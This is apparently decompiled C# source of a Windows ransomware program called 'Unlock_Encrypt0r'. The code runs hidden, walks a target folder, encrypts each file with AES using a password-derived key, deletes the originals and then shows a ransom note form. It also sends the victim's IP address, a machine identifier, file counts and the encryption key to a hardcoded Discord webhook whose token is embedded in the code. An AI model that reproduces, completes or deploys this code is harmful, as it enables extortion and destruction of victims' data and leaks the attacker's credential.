using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Unlock_Encrypt0r_1._0.My;

namespace Unlock_Encrypt0r_1._0;

[DesignerGenerated]
public class Form1 : Form
{
	public enum CryptoAction
	{
		ActionEncrypt = 1,
		ActionDecrypt
	}

	private string WEBHOOK;

	private Webhook Message;

	private object encryptedCount;

	private object encryptedCount2;

	private List<string> pcDetails;

	private string uuid;

	private string ip;

	private string strFileToEncrypt;

	private string strFileToDecrypt;

	private string strOutputEncrypt;

	private string strOutputDecrypt;

	private string filenamez;

	private FileStream fsInput;

	private FileStream fsOutput;

	private IContainer components;

	[field: AccessedThroughProperty("ListBox1")]
	internal virtual ListBox ListBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar1")]
	internal virtual ProgressBar ProgressBar1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("ProgressBar2")]
	internal virtual ProgressBar ProgressBar2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		WEBHOOK = "https://discord.com/api/webhooks/1030299312179126304/u-FduBdUKoqL67Htxwr2Qe9SUFrmvQsf5w0d5bqwGpm_ICfUPRmne0WgGDEqsk-k-bVo";
		Message = new Webhook(WEBHOOK);
		encryptedCount = 0;
		encryptedCount2 = 0;
		pcDetails = User.GetDetails();
		uuid = User.GetIdentifier();
		ip = User.GetIP();
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)MyProject.Forms.setup_ransom).Show();
		((Control)MyProject.Forms.setup_ransom).Hide();
		((Control)this).Hide();
		foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(MyProject.Forms.setup_ransom.path_folder_input.get_Text(), (SearchOption)3, new string[0]))
		{
			if (file.EndsWith(MyProject.Forms.setup_ransom.files_encryption.get_Text()))
			{
				ref object reference = ref encryptedCount2;
				reference = Operators.AddObject(reference, (object)1);
			}
			else
			{
				ref object reference2 = ref encryptedCount;
				reference2 = Operators.AddObject(reference2, (object)1);
				ListBox1.get_Items().Add((object)file);
			}
		}
		Message.Send("**Ransomware Executing Logs** ```Status: Active \n" + $"Files enc: {MyProject.Forms.setup_ransom.files_encryption.get_Text()}" + "\n" + $"Files: {RuntimeHelpers.GetObjectValue(encryptedCount)}" + "\n" + $"Skip Files: {RuntimeHelpers.GetObjectValue(encryptedCount2)}" + "\n" + $"UUID: {uuid}" + "\n" + $"IP Address: {ip}" + "\nIV-KEY\n" + $"{MyProject.Forms.setup_ransom.Key_encryption.get_Text()}```");
		Timer1.Start();
	}

	public byte[] CreateKey(string strPassword)
	{
		char[] array = strPassword.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			for (int i = 0; i <= upperBound2; i++)
			{
				array2[i] = (byte)Strings.Asc(array[i]);
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[32];
			int num = 0;
			do
			{
				array4[num] = array3[num];
				num++;
			}
			while (num <= 31);
			return array4;
		}
	}

	public byte[] CreateIV(string strPassword)
	{
		char[] array = strPassword.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			for (int i = 0; i <= upperBound2; i++)
			{
				array2[i] = (byte)Strings.Asc(array[i]);
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[16];
			int num = 32;
			do
			{
				array4[num - 32] = array3[num];
				num++;
			}
			while (num <= 47);
			return array4;
		}
	}

	public void EncryptOrDecryptFile(string strInputFile, string strOutputFile, byte[] bytKey, byte[] bytIV, CryptoAction Direction)
	{
		//IL_0195: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_020f: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			try
			{
				fsInput = new FileStream(strInputFile, FileMode.Open, FileAccess.Read);
				fsOutput = new FileStream(strOutputFile, FileMode.OpenOrCreate, FileAccess.Write);
				fsOutput.SetLength(0L);
				byte[] buffer = new byte[4097];
				long num = 0L;
				long length = fsInput.Length;
				RijndaelManaged rijndaelManaged = new RijndaelManaged();
				ProgressBar2.set_Value(0);
				ProgressBar2.set_Maximum(100);
				CryptoStream cryptoStream = default(CryptoStream);
				switch (Direction)
				{
				case CryptoAction.ActionDecrypt:
					cryptoStream = new CryptoStream(fsOutput, rijndaelManaged.CreateDecryptor(bytKey, bytIV), CryptoStreamMode.Write);
					break;
				case CryptoAction.ActionEncrypt:
					cryptoStream = new CryptoStream(fsOutput, rijndaelManaged.CreateEncryptor(bytKey, bytIV), CryptoStreamMode.Write);
					break;
				}
				while (num < length)
				{
					int num2 = fsInput.Read(buffer, 0, 4096);
					cryptoStream.Write(buffer, 0, num2);
					num += num2;
					ProgressBar2.set_Value((int)Math.Round((double)num / (double)length * 100.0));
				}
				cryptoStream.Close();
				fsInput.Close();
				fsOutput.Close();
				if (Direction == CryptoAction.ActionEncrypt)
				{
					FileInfo fileInfo = new FileInfo(strFileToEncrypt);
					fileInfo.Delete();
				}
				if (Direction == CryptoAction.ActionDecrypt)
				{
					FileInfo fileInfo2 = new FileInfo(strFileToDecrypt);
					fileInfo2.Delete();
				}
				string text = "\r\n";
				if (Direction == CryptoAction.ActionEncrypt)
				{
					Interaction.MsgBox((object)("Encryption Complete" + text + text + "Total bytes processed = " + num), (MsgBoxStyle)64, (object)"Done");
				}
				else
				{
					Interaction.MsgBox((object)("Decryption Complete" + text + text + "Total bytes processed = " + num), (MsgBoxStyle)64, (object)"Done");
				}
			}
			catch (Exception projectError) when (((Func<bool>)delegate
			{
				// Could not convert BlockContainer to single expression
				ProjectData.SetProjectError(projectError);
				return Information.Err().get_Number() == 53;
			}).Invoke())
			{
				Interaction.MsgBox((object)"Please check to make sure the path and filenameare correct and if the file exists.", (MsgBoxStyle)48, (object)"Invalid Path or Filename");
				ProjectData.ClearProjectError();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				fsInput.Close();
				fsOutput.Close();
				if (Direction == CryptoAction.ActionDecrypt)
				{
					FileInfo fileInfo3 = new FileInfo(filenamez);
					fileInfo3.Delete();
				}
				else
				{
					FileInfo fileInfo4 = new FileInfo(filenamez);
					fileInfo4.Delete();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	public void Encryptor(string strFiles_Scan1, string strFiles_Scan2, string strIV_set1, string strKey_set1)
	{
		byte[] bytKey = CreateKey(strKey_set1);
		byte[] bytIV = CreateIV(strIV_set1);
		EncryptOrDecryptFile(strFiles_Scan1, strFiles_Scan1 + strFiles_Scan2, bytKey, bytIV, CryptoAction.ActionEncrypt);
	}

	public void Decryptor(string strFiles_Scan3, string strIV_set2, string strKey_set2)
	{
		byte[] bytKey = CreateKey(strKey_set2);
		byte[] bytIV = CreateIV(strIV_set2);
		string strOutputFile = Strings.Replace(strFiles_Scan3, MyProject.Forms.setup_ransom.files_encryption.get_Text(), "", 1, -1, (CompareMethod)0);
		EncryptOrDecryptFile(strFiles_Scan3, strOutputFile, bytKey, bytIV, CryptoAction.ActionDecrypt);
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		ProgressBar1.set_Maximum(ListBox1.get_Items().get_Count());
		if (ProgressBar1.get_Value() == ListBox1.get_Items().get_Count())
		{
			Timer1.Stop();
			((Control)MyProject.Forms.Encryptor_Note).Show();
			((Control)this).Hide();
			return;
		}
		ListBox1.set_SelectedIndex(ProgressBar1.get_Value());
		ListBox1.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox1.get_SelectedItem());
		try
		{
			Encryptor(filenamez, MyProject.Forms.setup_ransom.files_encryption.get_Text(), MyProject.Forms.setup_ransom.Key_encryption.get_Text(), MyProject.Forms.setup_ransom.Key_encryption.get_Text());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			((Control)this).Hide();
			ProjectData.ClearProjectError();
		}
		ProgressBar1.Increment(1);
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		components = new Container();
		ListBox1 = new ListBox();
		ProgressBar1 = new ProgressBar();
		Timer1 = new Timer(components);
		ProgressBar2 = new ProgressBar();
		((Control)this).SuspendLayout();
		((ListControl)ListBox1).set_FormattingEnabled(true);
		ListBox1.set_ItemHeight(16);
		((Control)ListBox1).set_Location(new Point(-110, -110));
		((Control)ListBox1).set_Name("ListBox1");
		((Control)ListBox1).set_Size(new Size(140, 84));
		((Control)ListBox1).set_TabIndex(0);
		((Control)ProgressBar1).set_Location(new Point(-24, -35));
		((Control)ProgressBar1).set_Name("ProgressBar1");
		((Control)ProgressBar1).set_Size(new Size(140, 23));
		((Control)ProgressBar1).set_TabIndex(1);
		((Control)ProgressBar2).set_Location(new Point(-18, -43));
		((Control)ProgressBar2).set_Name("ProgressBar2");
		((Control)ProgressBar2).set_Size(new Size(140, 23));
		((Control)ProgressBar2).set_TabIndex(2);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(SystemColors.ActiveBorder);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Control)this).get_Controls().Add((Control)(object)ProgressBar2);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)ListBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Form)this).set_TransparencyKey(SystemColors.ActiveBorder);
		((Control)this).ResumeLayout(false);
	}
}
